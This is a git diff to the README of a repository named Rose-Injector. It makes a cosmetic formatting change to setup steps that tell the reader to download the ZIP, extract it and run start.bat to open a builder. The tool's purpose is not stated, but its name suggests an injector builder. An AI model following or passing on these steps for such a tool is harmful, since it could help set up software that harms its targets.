@@ -91,7 +91,7 @@
 
 - Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip).
 - Extract the ZIP folder which you just downloaded.
-- Run the [`start.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/start.bat) to have the [builder](https://github.com/DamagingRose/Rose-Injector/blob/main/components/builder.bat) open automatically.
+- Run the [`start.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/start.bat) to have the [`builder`](https://github.com/DamagingRose/Rose-Injector/blob/main/components/builder.bat) open automatically.
 
 ## <a id="preview"></a> Preview
 
